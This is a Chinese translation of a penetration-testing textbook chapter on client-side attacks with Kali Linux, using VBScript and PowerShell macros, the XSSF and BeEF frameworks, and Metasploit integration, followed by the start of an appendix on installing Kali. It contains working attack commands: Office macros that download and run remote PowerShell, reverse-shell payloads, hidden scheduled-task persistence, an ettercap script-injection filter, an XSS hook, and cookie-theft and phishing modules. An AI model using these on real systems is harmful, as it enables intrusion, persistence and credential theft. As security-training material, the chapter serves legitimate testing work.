+   使用脚本很容易，因为编写脚本只需要一个简单的文本编辑器。使用脚本发动攻击没有障碍。

历史上，JavaScript 是发动攻击的脚本语言选择，因为它在大多数目标系统上广泛可用。由于 JavaScript 攻击已经被充分描述，我们将重点介绍 Kali 如何利用更新的脚本语言（VBScript 和 PowerShell）进行攻击。

## 使用 VBScript 进行攻击

**Visual Basic Scripting Edition**（**VBScript**）是由微软开发的**Active Scripting 语言**。它旨在成为一个轻量级的、Windows 本地的语言，可以执行小型程序。自 Windows 98 以来，VBScript 已经默认安装在每个桌面版的 Microsoft Windows 上，使其成为客户端攻击的一个绝佳目标。

要使用 VBScript 发动攻击，我们将从命令行调用 Metasploit 的`msfpayload`。

```
root@kali:~# msfpayload windows/meterpreter/reverse_tcp
  LHOST=[Your local Host] LPORT= [Your Local Port] V 

```

注意`V`表示输出将是一个 VBS 宏脚本。输出将显示为一个具有两个特定部分的文本文件，如下面的屏幕截图所示：

![使用 VBScript 进行攻击](https://github.com/OpenDocCN/freelearn-kali-zh/raw/master/docs/ms-kali-adv-pentest/img/3121OS_11_01.jpg)

要使用脚本，打开 Microsoft Office 文档并创建一个宏（具体命令将取决于所使用的 Microsoft Windows 版本）。将以下信息框中给出的文本的第一部分（从`Sub Auto_Open()`到最后的`End Sub`）复制到宏编辑器中，并保存为启用宏。

```
'**************************************************************
'*
'* MACRO CODE
'*
'**************************************************************

Sub Auto_Open()
    Ffqsm12
    End Sub

// Additional code removed for clarity

Sub Workbook_Open()
    Auto_Open
End Sub
```

接下来，将 Shellcode 复制到实际文档中。Shellcode 的部分摘录如下屏幕截图所示：

![使用 VBScript 进行攻击](https://github.com/OpenDocCN/freelearn-kali-zh/raw/master/docs/ms-kali-adv-pentest/img/3121OS_11_02.jpg)

Shellcode 可识别为可用于执行攻击的脚本，因此您可能希望通过减小字体大小并使颜色与文档的背景匹配来隐藏或混淆 Shellcode。

攻击者必须在 Metasploit 上设置监听器。在命令提示符下输入`msfconsole`后，攻击者通常会输入以下命令，并设置主机、端口和有效载荷的选项；此外，攻击者还将配置连接自动迁移到更稳定的`explorer.exe`进程，如下面的命令行所示。

```
msf>use exploit/multi/handler 
msf>set lhost 192.168.43.130
msf>set lport 4444
msf>set payload windows/meterpreter/reverse_tcp
msf>set autorunscript migrate -n explorer.exe
msf >exploit 

```

当文件发送到目标时，打开时会弹出一个安全警告；因此，攻击者将使用社会工程学来迫使预期的受害者选择**启用**选项。最常见的方法之一是将宏嵌入已配置为玩游戏的 Microsoft Word 文档或 Excel 电子表格中。

打开文档将创建一个反向 TCP shell 返回给攻击者，允许攻击者确保与目标的持久连接并进行后期利用活动。

扩展这种攻击方法，我们可以使用位于`/usr/share/metasploit-framework/tools`的`exe2vba.rb`将任何可执行文件转换为 VBScript。

例如，首先使用 Metasploit 框架创建一个后门。注意`X`表示后门将被创建为一个可执行文件（`attack.exe`），如下面的屏幕截图所示：

![使用 VBScript 进行攻击](https://github.com/OpenDocCN/freelearn-kali-zh/raw/master/docs/ms-kali-adv-pentest/img/3121OS_11_03.jpg)

接下来，使用以下命令执行`exe2.vba`将可执行文件转换为 VBScript（确保使用正确的路径名）：

```
# ruby exe2vba.rb attack.exe  attack.vbs
[*] Converted 73802 bytes of EXE into a VBA script

```

这将允许将可执行文件放置在一个 Microsoft 启用宏的文档中并发送给客户端。VBScript 可用于执行反向 shell 并更改系统注册表，以确保 shell 保持持久。我们发现这种类型的攻击是绕过网络安全控制并保持与受保护网络连接的最有效方式之一。

从攻击者的角度来看，使用基于 VBScript 的漏洞利用有一些显著的优势（这仍然是一个强大的工具）。然而，它的使用正在迅速被更强大的脚本语言 PowerShell 所取代。

## 使用 Windows PowerShell 进行攻击系统

Windows PowerShell 是一个命令行 shell 和脚本语言，旨在用于系统管理。基于.NET 框架，它扩展了 VBScript 中可用的功能。语言本身是相当可扩展的。由于它是建立在.NET 库上的，你可以将来自诸如 C#或 VB.NET 等语言的代码合并进来。你还可以利用第三方库。尽管它是可扩展的，但它是一种简洁的语言。需要超过 100 行代码的 VBScript 可以减少到只有 10 行 PowerShell！

也许，PowerShell 最好的特性是它默认情况下在大多数现代基于 Windows 的操作系统（Windows 7 及更高版本）上可用，并且无法被移除。

我们将使用 Metasploit Framework 附带的 PowerShell 脚本来支持 Kill Chain 的攻击阶段。

为了发动攻击，我们将使用 Metasploit Framework 的 PowerShell Payload Web Delivery 模块。该模块的目的是快速在目标系统上建立会话。攻击不会写入磁盘，因此不太可能触发客户端防病毒软件的检测。攻击的启动和可用的模块选项如下截图所示：

![使用 Windows PowerShell 攻击系统](https://github.com/OpenDocCN/freelearn-kali-zh/raw/master/docs/ms-kali-adv-pentest/img/3121OS_11_04.jpg)

Metasploit Framework 将生成一个可以嵌入文档并用于发动攻击的一行宏，如下示例代码所示：

```
 Sub AutoOpen()
 Call Shell("PowerShell.exe -w hidden -nop -ep bypass -c ""IEX ((new-object net.webclient).downloadstring('http://192.168.1.102:4444/boom'))"",1)
 End Sub

```

在攻击完成之前，攻击者必须为传入 shell 准备一个监听器（`URIPATH`由 Metasploit 随机生成；确保为监听器设置正确的`URIPATH`）。创建监听器的命令如下：

```
 msf> use exploit/windows/misc/psh_web_delivery
 msf exploit(psh_web_delivery) > set SRVHOST 192.168.1.102
 msf exploit(psh_web_delivery) > set URIPATH boom
 msf exploit(psh_web_delivery) > exploit

```

成功的攻击将在攻击者的系统上创建一个交互式 shell。

### 提示

可以使用`schtask`命令使`psh_web_delivery`持久化。以下命令将创建一个计划任务`MSOfficeMngmt`，该任务将在登录时实现`powershell.exe`（默认情况下位于`Windows\system32`目录中）：

```
schtasks /create /tn MSOfficeMngmt /tr "powershell.exe -WindowsStyle hidden -NoLogo -NonInteractive -ep -bypass -nop -c 'IEX ((new-object net.webclient).downloadstring (''http://192.168.1.104:4444/boom'''))'" /sc onlogon /ru System

```

Kali 的 PowerSploit 目录中可以找到用于支持后期利用活动的额外 PowerShell 脚本。尽管 PowerShell 具有灵活性，但它也有一些缺点。

例如，如果最终用户在应用持久性机制之前关闭包含宏的文档，则连接将丢失。

更重要的是，诸如 VBScript 和 PowerShell 之类的脚本只对 Microsoft 环境有用。为了扩大客户端攻击的范围，我们需要寻找一个通用的客户端漏洞，无论其操作系统环境如何都可以利用。这种漏洞的一个特例就是跨站脚本攻击。

# 跨站脚本框架

**跨站脚本**（**XSS**）漏洞据报道是网站中发现的最常见的可利用漏洞。据估计，它们存在于高达 80％的所有应用程序中。

XSS 漏洞发生在应用程序（通常是基于 Web 的）违反了被称为**同源策略**的信任概念，并显示了未经消毒以删除恶意语句的用户提供的内容。

至少有两种主要类型的 XSS 漏洞：**非持久**和**持久**。

最常见的类型是非持久或反射漏洞。当客户端提供的数据立即被服务器用于显示响应时，就会发生这种漏洞。这种漏洞的攻击可以通过电子邮件或第三方网站提供看似引用受信任网站但包含 XSS 攻击代码的 URL 来发生。如果受信任的网站容易受到这种特定攻击的影响，执行该链接可能导致受害者的浏览器执行一个恶意脚本，可能导致妥协。

持久（存储）XSS 漏洞发生在攻击者提供的数据被服务器保存，然后在用户浏览过程中永久显示在受信任的网页上。这通常发生在允许用户发布 HTML 格式消息的在线留言板和博客上。攻击者可以在网页上放置一个对传入用户不可见的恶意脚本，但会危害访问受影响页面的访客。

Kali Linux 上存在一些工具用于查找 XSS 漏洞，包括 xsser 和各种漏洞扫描器。然而，有一些工具允许测试人员充分利用 XSS 漏洞，展示了这种弱点的严重性。

**跨站脚本框架**（**XSSF**）是一个多平台安全工具，利用 XSS 漏洞与目标创建通信渠道，支持包括：

+   对目标浏览器进行侦察（指纹识别和先前访问的 URL）、目标主机（检测虚拟机、获取系统信息、注册表键和无线键）以及内部网络。

+   向目标发送警报消息弹出。这种简单的“攻击”可以用来演示 XSS 漏洞，但更复杂的警报可以模仿登录提示并捕获用户身份验证凭据。

+   窃取使攻击者能够冒充目标的 Cookie。

+   将目标重定向以查看不同的网页。敌对的网页可能会自动下载一个漏洞利用到目标系统上。

+   加载 PDF 文件或 Java 小程序到目标，或从 Android 移动设备中窃取数据，如 SD 卡内容。

+   发动 Metasploit 攻击，包括`browser_autopwn`，以及拒绝服务攻击。

+   发动社会工程攻击，包括自动完成窃取、点击劫持、Clippy、假闪存更新、网络钓鱼和标签窃取。

此外，**XSSF 隧道**功能允许攻击者冒充受害者并使用其凭据和会话浏览网站。这可以是访问内部企业内部网的有效方法。

API 有很好的文档，允许轻松创建新的攻击模块。由于它是用 Ruby 编写的，API 与 Metasploit Framework 集成，允许攻击者发动额外的攻击。

要使用 XSSF，必须安装并配置以支持以下步骤的攻击：

1.  XSSF 不随 Kali 一起提供。首先，用户必须打开一个终端窗口，并使用以下命令设置适当的目录：

```
root@kali:~# cd /opt/metasploit/apps/pro/msf3

```

1.  使用以下命令安装 XSSF：

```
svn export http://xssf.googlecode.com/svn/trunk ./ --force 

```

确保使用`svn export`而不是`svn checkout`，因为后者的命令会破坏现有的 MSF `svn`文件。成功安装的摘录如下截图所示：

![跨站脚本框架](https://github.com/OpenDocCN/freelearn-kali-zh/raw/master/docs/ms-kali-adv-pentest/img/3121OS_11_05.jpg)

1.  从 Metasploit Framework 控制台，使用`load xssf`命令加载 XSSF 插件，如下截图所示：![跨站脚本框架](https://github.com/OpenDocCN/freelearn-kali-zh/raw/master/docs/ms-kali-adv-pentest/img/3121OS_11_06.jpg)

1.  通过输入`helpxssf`来识别 XSSF 命令，如下截图所示：![跨站脚本框架](https://github.com/OpenDocCN/freelearn-kali-zh/raw/master/docs/ms-kali-adv-pentest/img/3121OS_11_07.jpg)

1.  从控制台，使用以下命令访问与插件相关的 URL：

```
msf>xssf_urls

```

前一个命令的执行如下截图所示，可以看到识别出了几个 URL：

![跨站脚本框架](https://github.com/OpenDocCN/freelearn-kali-zh/raw/master/docs/ms-kali-adv-pentest/img/3121OS_11_08.jpg)

最重要的 URL 是位于本地主机上的 XSSF 服务器。还识别出了其他几个 URL，包括以下内容：

+   `通用 XSS 注入`：这是您试图让受害者点击或执行的目标。

+   `XSSF 测试页面`：XSSF 提供对易受 XSS 攻击的本地测试页面的访问。这可以用来在实际测试期间验证攻击和结果。

+   `XSSF 隧道代理`：XSSF 允许攻击者在保留其安全身份的同时使用受损主机的身份进行浏览。

+   `XSSF 日志页面`：记录攻击和接收到的信息。不幸的是，日志页面提供了一个非常黑暗的背景，很难看到返回的信息。在测试期间，我们通常通过命令行访问日志信息，这样更清晰，并且可以进行脚本化。

+   `XSSF 统计页面`。

+   `XSSF 帮助页面`。

我们将使用易受攻击的 Web 应用程序**Mutillidae**来演示 XSSF。Mutillidae 是 Metasploitable 项目的一部分，可以从[`sourceforge.net/projects/metasploitable/files/Metasploitable2/`](http://sourceforge.net/projects/metasploitable/files/Metasploitable2/)下载。有关安装此易受攻击目标的注意事项，请参阅附录*安装 Kali Linux*。

1.  一旦打开 Mutillidae，导航到博客页面；这个页面已知容易受到 XSS 攻击（您可以使用漏洞扫描工具对 Mutillidae 进行扫描，以识别其他潜在的插入点）。

要对目标客户端发动攻击，不要在博客中输入常规帖子。相反，输入包含目标 URL 和端口的脚本元素：

```
<script src="img/loop?interval=5"></script>
```

下面的截图显示了攻击代码在目标网站的博客页面上的放置。

![跨站脚本框架](https://github.com/OpenDocCN/freelearn-kali-zh/raw/master/docs/ms-kali-adv-pentest/img/3121OS_11_09.jpg)

当这个被输入并受害者点击**保存博客条目**时，他们的系统将被攻击。从 Metasploit Framework 控制台，测试人员可以使用`xssf_victims`和`xssf_information`命令获取有关每个受害者的信息。执行`xssf_victims`命令后，将显示有关每个受害者的信息，如下截图所示：

![跨站脚本框架](https://github.com/OpenDocCN/freelearn-kali-zh/raw/master/docs/ms-kali-adv-pentest/img/3121OS_11_10.jpg)

此时最常见的 XSS 攻击是向客户端发送简短且相对无害的消息或*警报*。使用 Metasploit Framework，可以通过输入以下命令相对简单地实现：

```
msf > use auxiliary/xssf/public/misc/alert
msf auxiliary(alert) > show options

```

在审查选项后，可以从命令行快速发送警报，如下截图所示：

![跨站脚本框架](https://github.com/OpenDocCN/freelearn-kali-zh/raw/master/docs/ms-kali-adv-pentest/img/3121OS_11_11.jpg)

受害者将看到一条消息，如下面的截图所示：

![跨站脚本框架](https://github.com/OpenDocCN/freelearn-kali-zh/raw/master/docs/ms-kali-adv-pentest/img/3121OS_11_12.jpg)

通常，大多数测试人员和他们的客户使用这样简单的警报消息来验证跨站脚本。这证明了“漏洞”存在。

然而，简单的警报缺乏情感冲击。它们经常识别出真正的漏洞，但客户端并不会因为警报消息被认为不构成重大威胁而对漏洞做出响应和调解。幸运的是，XSSF 允许测试人员“加大赌注”，展示更复杂和危险的攻击。

XSSF 可以使用以下命令来窃取 cookie：

```
msf> use auxiliary/xssf/public/misc/cookie
msfauxillary(cookie) > show options (ensure all needed options selected)
msfauxillary(cookie) > run

```

`run`命令的执行如下截图所示：

![跨站脚本框架](https://github.com/OpenDocCN/freelearn-kali-zh/raw/master/docs/ms-kali-adv-pentest/img/3121OS_11_13.jpg)

攻击完成后，可以通过查看 XSSF 日志页面的结果或直接使用命令来找到 cookie，如下截图所示：

![跨站脚本框架](https://github.com/OpenDocCN/freelearn-kali-zh/raw/master/docs/ms-kali-adv-pentest/img/3121OS_11_14.jpg)

`auxiliary/xssf/public/misc`中的一些其他有用的命令包括：

+   `check_connected`：此命令检查受害者是否已打开任何社交网络站点（Gmail、Facebook 或 Twitter）

+   `csrf`：它发动跨站点请求伪造攻击

+   `keylogger`：此命令在客户端上调用键盘记录器

+   `load_applet`和`load_pdf`：这些命令在客户端上加载恶意的 Java 小程序和 PDF 文件，并调用它们来启动预先配置的恶意软件

+   `redirect`：将客户端重定向到指定的网页

+   `webcam_capture`：此命令从客户端的网络摄像头中捕获图像

这只是一个不完整的列表，但它显示了该工具的发展程度。此外，还有一些用于网络扫描和发动拒绝服务攻击的模块，以及一些用于确保攻击完成后持久性的模块。

XSSF 还可以与 ettercap 一起用于破坏内部网络。例如，ettercap 可以用于将`</head>`数据替换为指向恶意页面的链接，方法是在名为`attack`的过滤器中放置以下代码：

```
if (ip.proto == TCP && tcp.src == 80) {
  if (search(DATA.data, "</head>")) {
    replace("</head>", "</head><script src=\"http://192.168.43.130:8888/test.html\"></script> ");
  }
}
```

然后必须使用以下命令将过滤脚本转换为二进制文件：

```
 etterfilter attack.filter –o attack.ef

```

要对网络上的所有用户发动此攻击，请使用以下命令执行`ettercap`：

```
 ettercap –T –q –F attack.ef –M ARP // //

```

XSSF，特别是当集成到 Metasploit Framework 中时，是利用 XSS 漏洞的非常强大的工具。然而，最近出现了一个新星，可以帮助您实现类似的攻击：浏览器利用框架。

# 浏览器利用框架-BeEF

BeEF 是一个专注于特定客户端应用程序的利用工具：Web 浏览器。

BeEF 允许攻击者使用 XSS 或 SQL 注入等攻击将 JavaScript 代码注入到易受攻击的 HTML 代码中。这种利用代码被称为**hook**。当浏览器执行 hook 时，就会实现妥协。浏览器（**zombie**）连接到 BeEF 应用程序，该应用程序向浏览器提供 JavaScript 命令或模块。

BeEF 的模块执行以下任务：

+   指纹识别和受损浏览器的侦察。它还可以用作评估存在于不同浏览器下的利用和其行为的平台。

### 注意

请注意，BeEF 允许我们在同一客户端上连接多个浏览器，以及跨域连接多个客户端，然后在利用和后利用阶段对它们进行管理。

+   对目标主机进行指纹识别，包括虚拟机的存在。

+   检测客户端上的软件（仅限 Internet Explorer）并获取`Program Files`和`Program Files（x86）`目录中的目录列表。这可能会识别其他可以利用以巩固我们对客户端的控制的应用程序。

+   使用受损系统的网络摄像头拍照；这些照片在报告中具有重要影响。

+   搜索受害者的数据文件并窃取可能包含身份验证凭据（剪贴板内容和浏览器 cookie）或其他有用信息的数据。

+   实施浏览器按键记录。

+   使用 ping 扫描和指纹网络设备进行网络侦察，并扫描开放端口。

+   从 Metasploit Framework 发动攻击。

+   使用隧道代理扩展攻击内部网络，利用受损的 Web 浏览器的安全权限。

因为 BeEF 是用 Ruby 编写的，所以它支持多个操作系统（Linux，Windows 和 OS X）。更重要的是，它很容易定制 BeEF 中的新模块并扩展其功能。

## 安装和配置浏览器利用框架

BeEF 不是 Kali 发行版的一部分，但已经打包了所需的依赖项，以支持在 Kali 中进行自动安装。要安装 BeEF，请使用以下命令：

```
root@kali:~# apt-get install beef-xss

```

BeEF 将安装在`/usr/share/beef-xss`目录中。默认情况下，它没有与 Metasploit Framework 集成。要集成 BeEF，您需要执行以下步骤：

1.  编辑位于`/usr/share/beef-xss/config.yaml`的主配置文件以读取：

```
metasploit:
  enable:true
```

1.  编辑位于`/usr/share/beef-xss/extensions/metasploit/config.yml`的文件。您需要编辑`host`，`callback_host`和`os 'custom'，path`行，以包括您的 IP 地址和 Metasploit Framework 的位置。正确编辑的`config.yml`文件如下屏幕截图所示：![安装和配置浏览器利用框架](https://github.com/OpenDocCN/freelearn-kali-zh/raw/master/docs/ms-kali-adv-pentest/img/3121OS_11_15.jpg)

1.  启动`msfconsole`，并加载`msgrpc`模块，如下面的屏幕截图所示。确保您也包括密码：![安装和配置浏览器利用框架](https://github.com/OpenDocCN/freelearn-kali-zh/raw/master/docs/ms-kali-adv-pentest/img/3121OS_11_16.jpg)

1.  使用以下命令启动 BeEF：

```
root@kali:~# cd /usr/share/beef-xss/
root@kali:/usr/share/beef-xss/~# ./beef

```

1.  通过查看程序启动时生成的消息来确认启动。它们应该表明发生了**与 Metasploit 的成功连接**，并伴随着 Metasploit 利用已被加载的指示。成功的程序启动如下屏幕截图所示：![安装和配置浏览器利用框架](https://github.com/OpenDocCN/freelearn-kali-zh/raw/master/docs/ms-kali-adv-pentest/img/3121OS_11_17.jpg)

### 提示

当您重新启动 BeEF 时，请使用`-x`开关重置数据库。

在此示例中，BeEF 服务器正在`192.168.222.129`上运行，而“hook URL”（我们希望目标激活的 URL）是`192.168.222.129:80/hook.js`。

BeEF 的大部分管理和管理是通过 Web 界面完成的。要访问控制面板，请转到 `http://<IP 地址>:3000/ui/panel`。

默认的登录凭据是 `用户名：beef` 和 `密码：beef`，如下面的屏幕截图所示，除非这些在 `config.yaml` 中被更改。

![安装和配置浏览器利用框架](https://github.com/OpenDocCN/freelearn-kali-zh/raw/master/docs/ms-kali-adv-pentest/img/3121OS_11_18.jpg)

# BeEF 浏览器的演示

当启动 BeEF 控制面板时，它将呈现 **入门** 屏幕，其中包含到在线站点的链接，以及可以用来验证各种攻击的演示页面。BeEF 控制面板如下屏幕截图所示：

![BeEF 浏览器的演示](https://github.com/OpenDocCN/freelearn-kali-zh/raw/master/docs/ms-kali-adv-pentest/img/3121OS_11_19.jpg)

如果您钩住了一个受害者，界面将分为两个面板：

+   在面板的左侧 **Hooked Browsers** 中，测试人员可以看到列出的每个连接的浏览器，以及有关其主机操作系统、浏览器类型、IP 地址和已安装插件的信息。因为 BeEF 设置了一个 cookie 来识别受害者，它可以参考这些信息并维护一个受害者的一致列表。

+   面板的右侧是所有操作的发起和结果的获取位置。在 **Commands** 选项卡中，我们看到了一个分类的存储库，其中列出了可以针对钩住的浏览器使用的不同攻击向量。这个视图会根据每个浏览器的类型和版本而有所不同。

BeEF 使用颜色编码方案来描述命令针对特定目标的可用性。使用的颜色如下：

+   **绿色**：表示命令模块针对目标有效，并且应该被受害者检测到

+   **橙色**：表示命令模块针对目标有效，但可能会被受害者检测到

+   **灰色**：表示命令模块尚未针对目标进行验证

+   **红色**：表示命令模块不针对目标有效。它可以使用，但其成功不被保证，并且使用可能被目标检测到

要注意这些指标，因为客户端环境的变化可能会使一些命令无效，或者可能导致其他意外的结果。

要开始攻击或钩住受害者，我们需要让用户点击 hook URL，其形式为 `<IP 地址>:<端口>/hook.js`。这可以通过各种方式实现，包括：

+   原始的 XSS 漏洞

+   中间人攻击（尤其是使用 **BeEF Shank**，**ARP** 欺骗工具，专门针对内部网络上的内部网站）

+   社会工程攻击，包括 BeEF 网页克隆和大规模邮件发送，使用 iFrame 冒充的自定义 hook 点，或者 QR 代码生成器

一旦浏览器被钩住，它被称为僵尸。从命令界面左侧的 **Hooked Browsers** 面板中选择僵尸的 IP 地址，然后参考可用的命令。

在下面的屏幕截图中显示的示例中，钩住的浏览器有几种不同的攻击和管理选项可用。其中最容易使用的攻击选项之一是社会工程学 Clippy 攻击。

当从 **Commands** 下的 **Module Tree** 中选择 **Clippy** 时，右侧会启动一个特定的 **Clippy** 面板，如下面的屏幕截图所示。它允许您调整图像、传递的文本以及如果受害者点击提供的链接将在本地启动的可执行文件。默认情况下，自定义文本通知受害者他们的浏览器已过时，提供更新，下载一个可执行文件（非恶意），然后感谢用户进行升级。所有这些选项都可以由测试人员更改。

![BeEF 浏览器的演示](https://github.com/OpenDocCN/freelearn-kali-zh/raw/master/docs/ms-kali-adv-pentest/img/3121OS_11_20.jpg)

当 Clippy 被执行时，受害者将在他们的浏览器上看到如下截图所示的消息：

![BeEF 浏览器的漫游](https://github.com/OpenDocCN/freelearn-kali-zh/raw/master/docs/ms-kali-adv-pentest/img/3121OS_11_21.jpg)

这可以是一个非常有效的社会工程攻击。在与客户进行测试时，我们成功率（客户下载了一个非恶意的指示文件）约为 70%。

提示模块的工作方式类似。它不是向受害者的浏览器发送简单的警报，而是发送一个通知请求，提示受害者输入数据。在许多情况下，如果受害者被提示输入未定义的数据，他们会自动重新输入他们的密码。提示可以要求特定的数据，或者可以用来引导受害者到一个包含恶意软件的系统补丁的网站上下载。下面的截图显示了获取用户密码的最简单和最有效的攻击之一。

![BeEF 浏览器的漫游](https://github.com/OpenDocCN/freelearn-kali-zh/raw/master/docs/ms-kali-adv-pentest/img/3121OS_11_22.jpg)

其中一个更有趣的攻击是 Pretty Theft，它要求用户提供他们在流行网站上的用户名和密码。例如，测试人员可以配置 Facebook 的 Pretty Theft 选项，如下面的截图所示：

![BeEF 浏览器的漫游](https://github.com/OpenDocCN/freelearn-kali-zh/raw/master/docs/ms-kali-adv-pentest/img/3121OS_11_23.jpg)

当攻击执行时，受害者会看到一个弹出窗口，看起来是合法的，如下面的截图所示：

![BeEF 浏览器的漫游](https://github.com/OpenDocCN/freelearn-kali-zh/raw/master/docs/ms-kali-adv-pentest/img/3121OS_11_24.jpg)

在 BeEF 中，测试人员可以从**命令结果**列的**数据**字段中查看攻击的历史记录，并得出用户名和密码，如下面的截图所示：

![BeEF 浏览器的漫游](https://github.com/OpenDocCN/freelearn-kali-zh/raw/master/docs/ms-kali-adv-pentest/img/3121OS_11_25.jpg)

## 将 BeEF 和 Metasploit 攻击集成

BeEF 和 Metasploit 框架都是使用 Ruby 开发的，可以一起操作来利用目标。因为它使用客户端和服务器端的指纹识别来描述目标，`browser_autopwn`是最成功的攻击之一。

一旦目标被钩住，启动 Metasploit 控制台，并使用以下命令配置攻击：

```
msf > use auxiliary/server/browser_autopwn
msf auxiliary(browser_autopwn) > set LHOST 192.168.43.130
msf auxiliary(browser_autopwn) > set PAYLOAD_WIN32
  windows/meterpreter/reverse_tcp
msf auxiliary(browser_autopwn) > set PAYLOAD_JAVA
  java/meterpreter/reverse_tcp
msf auxiliary(browser_autopwn) > exploit 

```

等待所有相关的漏洞加载完成。在下面的截图示例中，加载了 18 个漏洞。还要注意攻击的目标 URL。在这个例子中，目标 URL 是`http://192.168.43.130:8080/ICprp4Tnf4Z`：

![集成 BeEF 和 Metasploit 攻击](https://github.com/OpenDocCN/freelearn-kali-zh/raw/master/docs/ms-kali-adv-pentest/img/3121OS_11_26.jpg)

有几种方法可以指导浏览器点击目标 URL，但是，如果我们已经钩住了目标浏览器，我们可以使用 BeEF 的`redirect`功能。在 BeEF 控制面板中，转到**浏览器** | **钩住的域** | **重定向浏览器**。在提示时，使用此模块指向目标 URL，然后执行攻击。

在 Metasploit 控制台中，您将看到针对目标连续启动的攻击。成功的攻击将打开一个 Meterpreter 会话，如下面的截图所示：

![集成 BeEF 和 Metasploit 攻击](https://github.com/OpenDocCN/freelearn-kali-zh/raw/master/docs/ms-kali-adv-pentest/img/3121OS_11_27.jpg)

要查看与受损目标的打开会话列表，请键入`sessions -l`。要与特定会话进行交互连接，例如会话 1，键入`sessions -i 1`。

## 使用 BeEF 作为隧道代理

隧道是将有效载荷协议封装在传递协议（如 IP）内的过程。使用隧道，您可以在网络上传输不兼容的协议，或者可以绕过配置为阻止特定协议的防火墙。BeEF 可以配置为充当模拟反向 HTTP 代理的隧道代理：浏览器会话成为隧道，而被钩住的浏览器成为出口点。当内部网络被入侵时，这种配置非常有用，因为隧道代理可以用于：

+   在受害者的浏览器中浏览经过身份验证的站点的安全上下文（客户端 SSL 证书、身份验证 cookie、NTLM 哈希等）

+   使用受害者浏览器的安全上下文来爬取挂钩域

+   促进工具的使用，如 SQL 注入

要使用隧道代理，请选择要定位的挂钩浏览器，右键单击其 IP 地址。在弹出框中，如下截图所示，选择**使用作为代理**选项：

![使用 BeEF 作为隧道代理](https://github.com/OpenDocCN/freelearn-kali-zh/raw/master/docs/ms-kali-adv-pentest/img/3121OS_11_28.jpg)

配置浏览器以将 BeEF 隧道代理作为 HTTP 代理使用。默认情况下，代理的地址是`127.0.0.1`，端口是 6789。

如果您使用配置为 HTTP 代理的浏览器访问目标网站，所有原始请求/响应对将存储在 BeEF 数据库中，可以通过导航到**Rider** | **History**进行分析（日志摘录如下截图所示）。

![使用 BeEF 作为隧道代理](https://github.com/OpenDocCN/freelearn-kali-zh/raw/master/docs/ms-kali-adv-pentest/img/3121OS_11_29.jpg)

攻击完成后，有一些机制可以确保保持持久连接，包括：

+   **确认关闭**：当受害者尝试关闭选项卡时，该模块会弹出一个**确认导航 - 您确定要离开此页面**的弹出窗口。如果用户选择**离开此页面**，它将不起作用，并且**确认导航**弹出窗口将继续出现。

+   **弹出模块**：这在`config.yaml`中进行了配置。该模块尝试打开一个小的弹出窗口，以保持浏览器挂钩，如果受害者关闭主浏览器选项卡。这可能会被弹出窗口拦截器阻止。

+   **iFrame 键盘记录器**：重写网页上的所有链接，以覆盖原始页面高度和宽度的 iFrame。为了最大的有效性，它应该附加到 JavaScript 键盘记录器上。理想情况下，您会加载挂钩域的登录页面。

+   **浏览器中间人**：该模块确保每当受害者单击任何链接时，下一个页面也将被挂钩。避免这种行为的唯一方法是在地址栏中键入新地址。

最后，尽管 BeEF 提供了一系列优秀的模块来执行侦察，以及杀伤链的利用和后利用阶段，但已知的 BeEF 默认活动（/hook.js 和服务器标头）被用于检测攻击，降低了其有效性。测试人员将不得不使用诸如 Base64 编码、空格编码、随机化变量和删除注释等技术来混淆他们的攻击，以确保将来的完整有效性。

# 总结

在本章中，我们研究了针对通常与受保护网络隔离的系统的攻击。这些客户端攻击侧重于特定应用程序的漏洞。我们审查了敌对脚本，特别是 VBScript 和 PowerShell，这些脚本在测试和破坏基于 Windows 的网络方面特别有用。然后，我们研究了跨站脚本框架，它可以利用 XSS 漏洞，以及 BeEF 工具，它针对 Web 浏览器的漏洞。XSSF 和 BeEF 都与 Kali 上的侦察、利用和后利用工具集成，提供了全面的攻击平台。

本章结束了《精通 Kali Linux 高级渗透测试》。我们希望这本书能帮助您了解攻击者如何使用 Kali 等工具来破坏网络，以及您如何使用相同的工具来了解网络的漏洞并在您自己的网络受到损害之前加以调解。

# 附录 A. 安装 Kali Linux

Kali Linux 是一个基于 Linux 的操作系统，用作支持数百种不同应用程序的平台，用于审计网络的安全性。其复杂性与安装和使用它的多种方法相匹配。本章将涵盖安装 Kali 时需要考虑的一些因素，并将重点放在如何尽快启动和运行安全的虚拟机上。它还将探讨如何建立和维护一个廉价的站点，以测试本书中涵盖的材料。

# 下载 Kali Linux

有多种选项可用于下载和安装 Kali Linux。在本出版物发布时，最新版本是 1.06；但是，1.07 版本即将发布。当前版本可从官方网站([www.kali.org/downloads/](http://www.kali.org/downloads/))以 32 位和 64 位编译版本下载。

**Offensive Security**提供了预配置的**高级 RISC 机器**（**ARM**）处理器的版本（例如，Galaxy Note 10.1、Raspberry Pi 和 Samsung Chromebooks）可供下载；支持 ARMEL 和 ARMHL 平台。此外，预制的 VMware 映像也可在[`www.offensive-security.com/kali-llnux-vmware-arm-image-download/`](http://www.offensive-security.com/kali-llnux-vmware-arm-image-download/)上在线获取。

下载适当的映像后，请确保 SHA1 校验和文件是由 Kali 生成的（它将使用官方 Kali 加密密钥进行签名，可在线获取以验证下载的真实性），并检查 SHA1 校验和以验证映像的完整性。验证工具内置于 Linux 和 OSX 操作系统中；但是，您将不得不使用第三方工具，如**hashtab**（[`www.implbits.com/HashTab/HashTabWindows.aspx`](http://www.implbits.com/HashTab/HashTabWindows.aspx)）用于 Windows 操作系统。

如果您希望构建 Kali 的自定义版本，特别是具有备用桌面或工具集的版本，可以使用[`docs.kali.org/live-build/generate-updated-kali-iso`](http://docs.kali.org/live-build/generate-updated-kali-iso)上提供的 live-build 脚本。

# Kali Linux 的基本安装

一旦您获得了适当的 Kali Linux 发行版，就必须安装以供使用。以下安装选项可用：

+   安装到 i386、AMD64 或 ARM 系统硬盘。Kali Linux 将是设备启动时唯一的主机操作系统。

+   双启动系统。通常，在使用 MS Windows 操作系统时选择此选项。在启动时，用户可以选择将系统启动为 Kali Linux 或 Windows 操作系统。这比直接安装 Kali 到硬盘提供了更多的灵活性；但是，在两个系统之间切换会变得困难。

+   直接安装到 DVD 驱动器或 USB 设备。如果主机系统可以配置为从 USB 设备启动，则这是非常有用的；但是，如果 USB 设备需要是*持久的*（在测试过程中对基于操作系统、应用程序和数据所做的所有更改都将被保留），则需要进行额外的配置更改。

+   使用 VMware 或 VirtualBox 等产品安装为虚拟机。我们发现这是支持渗透测试最灵活的选项。

